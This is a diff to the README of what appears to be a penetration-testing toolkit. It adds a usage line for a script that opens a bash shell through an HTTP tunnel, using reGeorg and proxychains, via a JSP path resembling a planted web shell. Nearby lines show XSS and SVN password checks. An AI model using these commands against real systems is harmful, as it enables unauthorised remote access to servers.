@@ -39,6 +39,9 @@ node checkUrl.js -h
 ```
 ## New features
 ```
+# get bash shell,socks4 through http tunnel,auto use tmux and reGeorgSocksProxy.py
+tools/getBashShell_proxychains_http_tunnel.sh http://xxx:9002/uddi/.O01542895480635.jsp
+
 # check Xss
 cat /mysvn/new_url_list.txt|xargs -I % node tools/checkXss.js -v -u %
 # check svn paswd
